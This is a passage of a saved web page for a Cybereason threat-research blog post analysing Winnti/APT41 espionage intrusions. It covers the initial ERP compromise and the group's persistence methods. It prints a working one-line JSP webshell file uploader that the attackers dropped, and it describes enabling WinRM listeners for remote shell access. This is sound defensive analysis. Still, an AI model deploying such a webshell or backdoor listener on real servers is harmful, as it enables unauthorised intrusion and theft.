<!doctype html><!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en" > <![endif]--><!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en" >        <![endif]--><!--[if IE 8]>    <html class="no-js lt-ie9" lang="en" >               <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en"><!--<![endif]--><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="author" content="Cybereason Nocturnus">
    <meta name="description" content="Cybereason investigated multiple intrusions targeting technology and manufacturing companies located in Asia, Europe and North America. Based on the findings of our investigation, it appears that the goal behind these intrusions was to steal sensitive intellectual property for cyber espionage purposes...">
    <meta name="generator" content="HubSpot">
    <title>Operation CuckooBees: Deep-Dive into Stealthy Winnti Techniques</title>
    <link rel="shortcut icon" href="https://www.cybereason.com/hubfs/cr-favicon-1.png">
    
<meta name="viewport" content="width=device-width, initial-scale=1">

    
    <meta property="og:description" content="Cybereason investigated multiple intrusions targeting technology and manufacturing companies located in Asia, Europe and North America. Based on the findings of our investigation, it appears that the goal behind these intrusions was to steal sensitive intellectual property for cyber espionage purposes...">
    <meta property="og:title" content="Operation CuckooBees: Deep-Dive into Stealthy Winnti Techniques">
    <meta name="twitter:description" content="Cybereason investigated multiple intrusions targeting technology and manufacturing companies located in Asia, Europe and North America. Based on the findings of our investigation, it appears that the goal behind these intrusions was to steal sensitive intellectual property for cyber espionage purposes...">
    <meta name="twitter:title" content="Operation CuckooBees: Deep-Dive into Stealthy Winnti Techniques">

    

    
    <style>
a.cta_button{-moz-box-sizing:content-box !important;-webkit-box-sizing:content-box !important;box-sizing:content-box !important;vertical-align:middle}.hs-breadcrumb-menu{list-style-type:none;margin:0px 0px 0px 0px;padding:0px 0px 0px 0px}.hs-breadcrumb-menu-item{float:left;padding:10px 0px 10px 10px}.hs-breadcrumb-menu-divider:before{content:'›';padding-left:10px}.hs-featured-image-link{border:0}.hs-featured-image{float:right;margin:0 0 20px 20px;max-width:50%}@media (max-width: 568px){.hs-featured-image{float:none;margin:0;width:100%;max-width:100%}}.hs-screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px}
</style>

<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/module_assets/1/41681847227/1741488491170/module_CR_-_Malicious_Life_Network_--_Tier_One_Header.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/module_assets/1/41682410610/1741488492472/module_CR_-_Malicious_Life_Network_--_Main_Hero.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/module_assets/1/48386556055/1741488537305/module_CR_-_HTML_PopUp_Window_--_IOCs.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/module_assets/1/43300360745/1741488505140/module_CR_-_Malicious_Life_Network_--_Related_Posts.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/module_assets/1/86933076631/1741488758324/module_CR_-_Sticky_CTA_Bar.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/module_assets/1/34473990280/1740999337265/module_CR_-_Footer_Full__en_US.min.css">
    

    
<!--  Added by GoogleTagManager integration -->
<script>
var _hsp = window._hsp = window._hsp || [];
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}

var useGoogleConsentModeV2 = true;
var waitForUpdateMillis = 1000;



var hsLoadGtm = function loadGtm() {
    if(window._hsGtmLoadOnce) {
      return;
    }

    if (useGoogleConsentModeV2) {

      gtag('set','developer_id.dZTQ1Zm',true);

      gtag('consent', 'default', {
      'ad_storage': 'denied',
      'analytics_storage': 'denied',
      'ad_user_data': 'denied',
      'ad_personalization': 'denied',
      'wait_for_update': waitForUpdateMillis
      });

      _hsp.push(['useGoogleConsentModeV2'])
    }

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-TJVVB7C');

    window._hsGtmLoadOnce = true;
};

_hsp.push(['addPrivacyConsentListener', function(consent){
  if(consent.allowed || (consent.categories && consent.categories.analytics)){
    hsLoadGtm();
  }
}]);

</script>

<!-- /Added by GoogleTagManager integration -->


<script src="https://use.typekit.net/vyv2ljd.js"></script>
<script>try{Typekit.load({ async: false });}catch(e){}</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<link rel="preload" href="/hubfs/__dam/fonts/ionicons.eot" as="font" type="font/otf" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/criteria/Criteria-CF-Regular.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/criteria/Criteria-CF-Medium.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/hubfs/dam/fonts/peristyle/Peristyle-Black.woff2" as="font" type="font/woff2" crossorigin>
<link rel="amphtml" href="https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques?hs_amp=true">

<meta property="og:image" content="https://www.cybereason.com/hubfs/blog-post-text%20%2887%29.png">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="628">

<meta name="twitter:image" content="https://www.cybereason.com/hubfs/blog-post-text%20%2887%29.png">


<meta property="og:url" content="https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:creator" content="@cr_nocturnus">

<link rel="canonical" href="https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques">

<meta property="og:type" content="article">
<link rel="alternate" type="application/rss+xml" href="https://www.cybereason.com/blog/rss.xml">
<meta name="twitter:domain" content="www.cybereason.com">
<script src="//platform.linkedin.com/in.js" type="text/javascript">
    lang: en_US
</script>

<meta http-equiv="content-language" content="en">
<link rel="stylesheet" href="//7052064.fs1.hubspotusercontent-na1.net/hubfs/7052064/hub_generated/template_assets/DEFAULT_ASSET/1758133255350/template_layout.min.css">


<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/template_assets/1/34470223313/1741528336747/template_cr-master__cta.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/template_assets/1/34470477360/1743626992502/template_cr-master__main.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/template_assets/1/35275979682/1741528339661/template_ionicons.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/template_assets/1/42760289143/1741528346957/template_cr-mln__build.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/template_assets/1/34470224480/1741528337131/template_cr-framework__bulma-columns.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/template_assets/1/35291999472/1741528340159/template_cr-framework__bulma.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/template_assets/1/42363645447/1741528345735/template_hamburger-animation.min.css">
<link rel="stylesheet" href="https://www.cybereason.com/hubfs/hub_generated/template_assets/1/42507091846/1741528346726/template_animate.min.css">


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
<script src="/hubfs/dam/plugins/marker-animation.js"></script>
<script>
$(document).ready(function() {
  $('.highlight').markerAnimation({
    "color":'var(--cr-yellow)',
    "font_weight":'normal',
    "background-size": '200% 1.2em'
  });
});
</script>

    <style>
.cr-mln__blog-post .container-is-blog.cr-mln__blog-post--body .column.is-7-fullhd.is-7-desktop img {
    background: #FFFFFF;
    border: 1px solid #CCCCCC;
    border-radius: 5px 5px 5px 5px;
    padding: 10px;
} 
</style>

</head>
<body class="   hs-content-id-72000117095 hs-blog-post hs-blog-id-5272851739" style="">
<!--  Added by AdRoll integration -->
<script type="text/javascript">
  adroll_adv_id = "GKBVDT7O5ZHV7BPLJ2GO75";
  adroll_pix_id = "LEUF46G3Y5H6XKRQDHO77F";
  var _hsp = window._hsp = window._hsp || [];
  (function () {
      var _onload = function(){
          if (document.readyState && !/loaded|complete/.test(document.readyState)){setTimeout(_onload, 10);return}
          if (!window.__adroll_loaded){__adroll_loaded=true;setTimeout(_onload, 50);return}
          _hsp.push(['addPrivacyConsentListener', function(consent) { if (consent.allowed || (consent.categories && consent.categories.advertisement)) {
            var scr = document.createElement("script");
            var host = (("https:" == document.location.protocol) ? "https://s.adroll.com" : "http://a.adroll.com");
            scr.setAttribute('async', 'true');
            scr.type = "text/javascript";
            scr.src = host + "/j/roundtrip.js";
            ((document.getElementsByTagName('head') || [null])[0] ||
                document.getElementsByTagName('script')[0].parentNode).appendChild(scr);
          }}]);
      };
      if (window.addEventListener) {window.addEventListener('load', _onload, false);}
      else {window.attachEvent('onload', _onload)}
  }());
</script>

<!-- /Added by AdRoll integration -->

<!--  Added by GoogleTagManager integration -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TJVVB7C" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- /Added by GoogleTagManager integration -->

    <div class="header-container-wrapper">
    <div class="header-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433790649568" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section id="cr-malicious-life-network__tier-one-header" class="position-flex">
  <div class="#">
    <div id="logo"><a href="https://www.cybereason.com"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-logo-inline--primary-black.png"></a></div>
    <div id="back-to">
      <a href="https://www.cybereason.com">Back to <span>Cybereason.com</span></a>
    </div>
    <!-- Hamburger Menu -->
    <button class="hamburger hamburger--collapse" type="button">
      <span class="hamburger-box">
        <span class="hamburger-inner"></span>
      </span>
    </button>
    <div class="cr-mln__hamburger-menu--overlay">
      <ul>
        <li><a href="https://www.cybereason.com/blog/all"><span class="underline">All Posts</span></a></li>
        <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
        <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
        <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
        <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
        <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
        <li><a href="/blog/category/news"><span class="underline">News</span></a></li>
      </ul>
      <div class="subscribe">
        <a href="#blog-subscribe">Subscribe</a>
      </div>
    </div>
    <!-- -->
  </div>
</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget mln-homepage" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1615433785464566" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><section class="cr-malicious-life-network__hero-main base">
  <div class="container-is-blog columns hero-content page-center">
    <div class="column is-5-fullhd is-5-desktop is-12-touch">
      <a href="/blog"><img class="cr-mln-logo" src="https://www.cybereason.com/hubfs/dam/images/images-web/logos/cr-brand/cr-malicious-life-logo-v2.png"></a>
    </div>
    <div class="column is-7-fullhd is-7-desktop is-hidden-mobile is-hidden-tablet-only">
      <div class="cr-mln__search-subscribe">
        <div class="cr-mln__search">
          <a href="#cr-search-modal" class="search-btn"><img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/cr-blog-icon--search-dark-gray.png" alt="Search"></a>
        </div>
        <div class="cr-mln__subscribe">
          <a class="btn-subscribe" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>
      <div class="cr-mln__category-nav">
        <ul>
          <li><a href="/blog/category/all"><span class="underline">All</span></a></li>
          <li><a href="/blog/category/research"><span class="underline">Research</span></a></li>
          <li><a href="/blog/category/podcasts"><span class="underline">Podcasts</span></a></li>
          <li><a href="/blog/category/webinars"><span class="underline">Webinars</span></a></li>
          <li><a href="/blog/category/resources"><span class="underline">Resources</span></a></li>
          <li><a href="/blog/category/videos"><span class="underline">Videos</span></a></li>
          <li><a href="/blog/category/news"><span class="underline">News</span></a></li>
        </ul>
      </div>
    </div>
  </div>
      <!-- MOBILE Search and Subscribe -->
      <div class="container-is-blog columns is-gapless is-hidden-desktop cr-mln__search-subscribe--mobile">
        <div class="column">
          <a class="search-btn">Search</a>
        </div>
        <div class="column">
          <a class="#" href="#blog-subscribe">Subscribe</a>
        </div>
      </div>

      <!-- END MOBILE Search and Subscribe -->
  
  <!-- SEARCH Modal Wrap -->

  <div id="cr-search-modal">
        <!--THIS IS IMPORTANT! to close the modal, the class name has to match the name given on the ID -->
        <div id="btn-close-modal" class="close-cr-search-modal"> 
            X
        </div>

        <div class="modal-content">
            <div class="container columns">
              <div class="column">
                <div class="cr-search-modal__search-bar">
                  <h3>Search</h3>
                  <form action="/hs-search-results">
                    <input type="search" class="hs-search-field__input" name="term" autocomplete="on" placeholder="Search...">
                    <input type="hidden" name="type" value="BLOG_POST">
                    <input type="hidden" name="type" value="LISTING_PAGE">
                    <button type="submit" class="arrow"></button>
                  </form>
                  
                </div>

              </div>
          </div>
        </div>
    </div>
  <!-- END Search Modal Wrap -->

</section></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

    </div><!--end header -->
</div><!--end header wrapper -->

<div class="body-container-wrapper">
    <div class="body-container container-fluid">

<div class="row-fluid-wrapper row-depth-1 row-number-1 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-blog_content " style="" data-widget-type="blog_content" data-x="0" data-w="12">







<div class="cr-mln__blog-post">
  <div class="container-is-blog columns is-multiline page-center">

    <div class="column is-8-fullhd is-8-desktop is-offset-2-fullhd is-offset-2-desktop is-10-tablet is-offset-1-tablet">
      <div class="featured-image"><img src="https://www.cybereason.com/hubfs/blog-post-text%20%2887%29.png" alt=""></div>
      <h1><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Operation CuckooBees: Deep-Dive into Stealthy Winnti Techniques</span></h1>
      <div class="cr-mln__post-author-share">
      <div id="hubspot-author_data" class="hubspot-editable cr-mln__post-meta" data-hubspot-form-id="author_data" data-hubspot-name="Blog Author">
        
          <span class="descriptor">Written By</span>
          <p><span class="author">Cybereason Nocturnus</span></p>
         
      </div>
    </div>
     
    </div>
    
    <!-- Sticky Author and Social Box -->
    
    <!-- END Sticky Author and Social Box -->
      <div class="container-is-blog columns is-multiline page-center cr-mln__blog-post--body">
        
        <div class="column is-7-fullhd is-7-desktop is-10-tablet is-10-mobile is-offset-1-fullhd is-offset-1-desktop is-offset-1-tablet is-offset-1-mobile">
          <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>In 2021, the <a href="/services/incident-response" rel="noopener" target="_blank"><span>Cybereason Nocturnus Incident Response Team</span></a> investigated multiple intrusions targeting technology and manufacturing companies located in Asia, Europe and North America. Based on the findings of our investigation, it appears that the goal behind these intrusions was to steal sensitive intellectual property for cyber espionage purposes.&nbsp;</p>
<!--more-->
<p>Cybereason assesses with moderate-high confidence that the threat actor behind the intrusion is the <a href="https://attack.mitre.org/groups/G0044/" rel="noopener" target="_blank"><span>Winnti Group</span></a> (also tracked as APT41, Blackfly and BARIUM), one of the most advanced and elusive APT groups that is known to operate on behalf of Chinese state interests and whose members have been indicted by the <a href="https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer"><span>US Department of Justice</span></a> for severe computer crimes.&nbsp;</p>
<p>Part 1 of this research offers a unique glimpse into the Winnti intrusion playbook, covering the techniques that were used by the group from initial compromise to data exfiltration, as observed and analyzed by the Cybereason IR Team. <a href="/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive" rel="noopener" target="_blank"><span>Part two of this research</span></a> will offer a deep dive analysis of the group’s tools and unique malware, including undocumented newly discovered Winnti malware.</p>
<h2 style="font-size: 30px;">Key Findings</h2>
<ul>
<li aria-level="1"><strong>Multi-year Cyber Espionage Intrusions: </strong>The Cybereason IR team investigated a sophisticated and elusive cyber espionage operation that has remained undetected since at least 2019 with the goal of stealing sensitive proprietary information from technology and manufacturing companies, mainly in East Asia, Western Europe, and North America.&nbsp;</li>
<li aria-level="1"><strong>Newly Discovered Malware and Multi-Stage Infection Chain:</strong> <a href="/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive" rel="noopener" target="_blank">Part two of the research</a> examines both known and previously undocumented Winnti malware which included digitally signed kernel-level rootkits as well as an elaborate multi-stage infection chain which enabled the operation to remain undetected since at least 2019.</li>
</ul>
<ul>
<li aria-level="1"><strong>Winnti APT Group: </strong>Cybereason assesses with moderate-to-high confidence that the threat actor behind the set of intrusions is the Winnti Group, a Chinese state-sponsored APT group known for its stealth, sophistication and a focus on stealing technology. <strong>&nbsp;</strong></li>
</ul>
<ul>
<li aria-level="1"><strong>The Winnti Playbook: </strong>This research offers a unique glimpse into the Winnti intrusion playbook, detailing the most frequently used tactics, as well as some lesser known evasive techniques that were observed during the investigation.&nbsp;</li>
</ul>
<h2 style="font-size: 30px;">The Winnti Attack Lifecycle</h2>
<p>During 2021, Cybereason Nocturnus investigated an elaborate espionage operation targeting a number of prominent organizations in Asia, Europe and North America. Cybereason attributes with moderate-to-high confidence that this operation was carried out by the <a href="https://attack.mitre.org/groups/G0044/" rel="noopener" target="_blank"><span>Winnti APT group</span></a> (also known as APT41, BARIUM, and Blackfly) - a Chinese state-sponsored APT that has been active since at least 2010.&nbsp;</p>
<p>For years, this operation has remained under the radar, concealing a multi-layered attack scheme, with a wide and quite comprehensive toolbox. The following flow chart summarizes this group’s attack life cycle in this operation:</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/Capture-May-02-2022-08-50-17-72-PM.png?width=748&amp;name=Capture-May-02-2022-08-50-17-72-PM.png" alt="Capture-May-02-2022-08-50-17-72-PM" width="748" loading="lazy" style="width: 748px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/Capture-May-02-2022-08-50-17-72-PM.png?width=374&amp;name=Capture-May-02-2022-08-50-17-72-PM.png 374w, https://www.cybereason.com/hs-fs/hubfs/Capture-May-02-2022-08-50-17-72-PM.png?width=748&amp;name=Capture-May-02-2022-08-50-17-72-PM.png 748w, https://www.cybereason.com/hs-fs/hubfs/Capture-May-02-2022-08-50-17-72-PM.png?width=1122&amp;name=Capture-May-02-2022-08-50-17-72-PM.png 1122w, https://www.cybereason.com/hs-fs/hubfs/Capture-May-02-2022-08-50-17-72-PM.png?width=1496&amp;name=Capture-May-02-2022-08-50-17-72-PM.png 1496w, https://www.cybereason.com/hs-fs/hubfs/Capture-May-02-2022-08-50-17-72-PM.png?width=1870&amp;name=Capture-May-02-2022-08-50-17-72-PM.png 1870w, https://www.cybereason.com/hs-fs/hubfs/Capture-May-02-2022-08-50-17-72-PM.png?width=2244&amp;name=Capture-May-02-2022-08-50-17-72-PM.png 2244w" sizes="(max-width: 748px) 100vw, 748px"></p>
<p style="text-align: left;">The attackers’ initial foothold in the organization originated from multiple vulnerabilities in the organizational <a href="https://en.wikipedia.org/wiki/Enterprise_resource_planning" rel="noopener" target="_blank"><span>ERP</span></a> (Enterprise Resource Planning) platform. From there, the attackers installed persistence in the form of a WebShell and began conducting reconnaissance and credential dumping, enabling them to move laterally in the network. Ultimately, it allowed the attackers to steal highly sensitive information from critical servers and endpoints belonging to high-profile stakeholders.&nbsp;</p>
<p>Analysis of the data available to Cybereason suggests that the goal of the operation was focused on cyber espionage with the aim of stealing proprietary information, R&amp;D documents, source code and blueprints for various technologies.&nbsp;</p>
<p>The attackers managed to go undetected for years by using stealthy techniques combined with state-of-the-art attack and espionage tools which included advanced rootkits.&nbsp;</p>
<h3 style="font-size: 24px; font-weight: normal;"><span style="color: #434343;">Initial Compromise</span></h3>
<p>According to the Cybereason IR investigation, the infection vector that was used to compromise Winnti targets consisted of the exploitation of a popular ERP solution leveraging multiple vulnerabilities, some known and some that were unknown at the time of the exploitation.&nbsp;</p>
<p>One of the first actions that were taken after a successful exploit was an attempt to find a specific DLL file under the VMware Tools folder, <em>gthread-3.6.dll</em>. The DLL file is invoked by the intermediate dropper, and the role of the DLL is to inject the payload into <em>svchost.exe</em> on the targeted system. This TTP has been observed before, and is <a href="https://redmimicry.com/posts/redmimicry-winnti/" rel="noopener" target="_blank"><span>known to be characteristic</span></a> of the Winnti group:</p>
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;">
<tbody>
<tr>
<td style="border: 1pt solid #000000;">
<p style="text-align: center;">dir "C:\Program Files\VMware\VMware Tools\gthread-3.6.dll"</p>
</td>
</tr>
</tbody>
</table>
<p style="text-align: center; font-size: 16px;"><em>Command line to search for the DLL file</em></p>
<p>Searching for this DLL could suggest that the attackers had already compromised that environment in the past, or that they were attempting to avoid infecting endpoints already compromised by them.</p>
<h3 style="font-size: 24px; font-weight: normal;"><span style="color: #434343;">Persistence</span></h3>
<p>The Cybereason Nocturnus IR team observed multiple persistence techniques that were used by Winnti over the course of the intrusion. While some techniques are quite trivial and well-known, some persistence techniques are rare and advanced which only a handful of threat actors are known to have used before.</p>
<h4 style="font-size: 20px; font-weight: normal;"><span style="color: #666666;">Persistence Technique #1: WebShell&nbsp;</span></h4>
<p>The first attempt to establish a foothold on “patient zero” was achieved by embedding a minimal <a href="https://en.wikipedia.org/wiki/Jakarta_Server_Pages" rel="noopener" target="_blank"><span>JSP</span></a> code for deploying a Webshell under the ERP Web Application server directory using an RCE exploit:</p>
<ul>
<li aria-level="1">The attackers dropped an encoded VBScript version of the Webshell to the <em>%UserProfile% </em>directory off the ERP Web Service account.</li>
<li aria-level="1">Once the attackers wrote the dropper to the disk, they executed the encoded VBScript file using <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wscript" rel="noopener" target="_blank"><span>wscript</span></a> and wrote the decoded output to a text file.</li>
<li aria-level="1">The final step was copying the output text file to a folder that is accessible externally via the ERP Web Service and changing the extension to .jsp so it would act as a Webshell:</li>
</ul>
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;">
<tbody>
<tr>
<td style="border: 1pt solid #000000;">
<p style="font-size: 14px;"><span style="color: #1d1c1d;">&lt;%</span></p>
<p style="font-size: 14px;"><span style="color: #1d1c1d;">if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());</span></p>
<p style="font-size: 14px;"><span style="color: #1d1c1d;">%&gt;</span></p>
</td>
</tr>
</tbody>
</table>
<p style="text-align: center; font-size: 16px;"><em>A sample file uploader dropped by the Threat Actor</em></p>
<p>It is interesting to note that the above code has been known since at least August 2006, and has been published in several <a href="https://www.google.com/search?q=%3C%25+if%28request.getParameter%28%22f%22%29%21%3Dnull%29%28new+java.io.FileOutputStream%28application.getRealPath%28%22%5C%5C%22%29%2Brequest.getParameter%28%22f%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B+%25%3E&amp;tbas=0&amp;biw=1552&amp;bih=1020&amp;source=lnt&amp;tbs=cdr%3A1%2Ccd_min%3A1%2F1%2F2000%2Ccd_max%3A1%2F1%2F2013&amp;tbm=" rel="noopener" target="_blank"><span>Chinese hacking websites</span></a>, as well on <a href="https://github.com/"><span>GitHub</span></a> repositories owned by Chinese-speaking users introducing this code as a one-liner for trojan or backdoor uploads:</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/image3-Apr-26-2022-06-57-39-38-PM.png?width=840&amp;name=image3-Apr-26-2022-06-57-39-38-PM.png" alt="image3-Apr-26-2022-06-57-39-38-PM" width="840" loading="lazy" style="width: 840px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image3-Apr-26-2022-06-57-39-38-PM.png?width=420&amp;name=image3-Apr-26-2022-06-57-39-38-PM.png 420w, https://www.cybereason.com/hs-fs/hubfs/image3-Apr-26-2022-06-57-39-38-PM.png?width=840&amp;name=image3-Apr-26-2022-06-57-39-38-PM.png 840w, https://www.cybereason.com/hs-fs/hubfs/image3-Apr-26-2022-06-57-39-38-PM.png?width=1260&amp;name=image3-Apr-26-2022-06-57-39-38-PM.png 1260w, https://www.cybereason.com/hs-fs/hubfs/image3-Apr-26-2022-06-57-39-38-PM.png?width=1680&amp;name=image3-Apr-26-2022-06-57-39-38-PM.png 1680w, https://www.cybereason.com/hs-fs/hubfs/image3-Apr-26-2022-06-57-39-38-PM.png?width=2100&amp;name=image3-Apr-26-2022-06-57-39-38-PM.png 2100w, https://www.cybereason.com/hs-fs/hubfs/image3-Apr-26-2022-06-57-39-38-PM.png?width=2520&amp;name=image3-Apr-26-2022-06-57-39-38-PM.png 2520w" sizes="(max-width: 840px) 100vw, 840px"><span style="font-size: 16px;"><em>JSP code snippet search results on Google&nbsp;</em></span></p>
<p>Multiple instances of such .jsp files were found on ERP servers. Based on the analysis of the source files found in our searches, we determined the aforementioned Webshell was almost identical to a publicly known Webshell called <a href="https://github.com/chickenlove/webshell/blob/master/jsp/hackk8/jsp_77/win32/up_win32.jsp" rel="noopener" target="_blank"><span>up_win32.jsp</span></a>. Moreover, we found another Webshell named <a href="https://github.com/chickenlove/webshell/blob/master/jsp/css.jsp"><span>css.jsp</span></a>, which has similarities to the code of another publicly known Webshell called <a href="https://github.com/chickenlove/webshell/blob/master/jsp/hackk8/jsp_77/win32/cmd_win32.jsp" rel="noopener" target="_blank"><span>cmd_win32.jsp</span></a>:</p>
<p style="text-align: center;"><span style="font-size: 10px; color: #575955;"><img src="https://www.cybereason.com/hs-fs/hubfs/image2-Apr-26-2022-06-58-22-80-PM.png?width=1357&amp;name=image2-Apr-26-2022-06-58-22-80-PM.png" alt="image2-Apr-26-2022-06-58-22-80-PM" width="1357" loading="lazy" style="width: 1357px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image2-Apr-26-2022-06-58-22-80-PM.png?width=679&amp;name=image2-Apr-26-2022-06-58-22-80-PM.png 679w, https://www.cybereason.com/hs-fs/hubfs/image2-Apr-26-2022-06-58-22-80-PM.png?width=1357&amp;name=image2-Apr-26-2022-06-58-22-80-PM.png 1357w, https://www.cybereason.com/hs-fs/hubfs/image2-Apr-26-2022-06-58-22-80-PM.png?width=2036&amp;name=image2-Apr-26-2022-06-58-22-80-PM.png 2036w, https://www.cybereason.com/hs-fs/hubfs/image2-Apr-26-2022-06-58-22-80-PM.png?width=2714&amp;name=image2-Apr-26-2022-06-58-22-80-PM.png 2714w, https://www.cybereason.com/hs-fs/hubfs/image2-Apr-26-2022-06-58-22-80-PM.png?width=3393&amp;name=image2-Apr-26-2022-06-58-22-80-PM.png 3393w, https://www.cybereason.com/hs-fs/hubfs/image2-Apr-26-2022-06-58-22-80-PM.png?width=4071&amp;name=image2-Apr-26-2022-06-58-22-80-PM.png 4071w" sizes="(max-width: 1357px) 100vw, 1357px"></span><span style="font-size: 16px;"><em>ERP exploitation process tree as seen in the Cybereason XDR Platform</em></span></p>
<p>After establishing a Webshell-based foothold, the attackers shifted their focus to internal reconnaissance and lateral movement efforts. This is not the first time Winnti has used Webshell as a foothold tactic; in March 2021, ESET published a <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/" rel="noopener" target="_blank"><span>report</span></a> naming Winnti as one of the groups that targeted Exchange servers and deployed Webshell on the compromised systems.</p>
<h4 style="font-size: 20px; font-weight: normal;"><span style="color: #666666;">Persistence Technique #2: WinRM over HTTP/HTTPS</span></h4>
<p>The Cybereason Nocturnus &amp; IR Team investigation also revealed a second persistence mechanism that granted the attackers an additional backup entry point enabling the native Windows feature WinRM over HTTP/HTTPS on the compromised servers.</p>
<p><a href="https://attack.mitre.org/techniques/T1021/006/"><span>WinRM</span></a> is a Microsoft Windows native remote management protocol that provides remote shell access. This protocol can be configured with a HTTP (Port 80) or HTTPS (Port 443) listener using the WinRM Scripting API called through a legitimate Visual Basic script file called <a href="https://docs.microsoft.com/en-us/windows/win32/winrm/scripting-in-windows-remote-management" rel="noopener" target="_blank"><span>Winrm.vbs</span></a>.&nbsp;</p>
<p>The attackers executed <a href="https://lolbas-project.github.io/lolbas/Binaries/Cscript/" rel="noopener" target="_blank"><span>cscript.exe</span></a> to modify the system’s WinRM configuration by setting the values of <em>EnableCompatibilityHttpListener</em> and <em>EnableCompatibilityHttpsListener </em>to <em>True, and </em>by doing so, they enabled HTTP and HTTPS listeners for remote shell access, preserving another way of persistence with c&nbsp;cscript command line to enable HTTP and HTTPS listeners:&nbsp;</p>
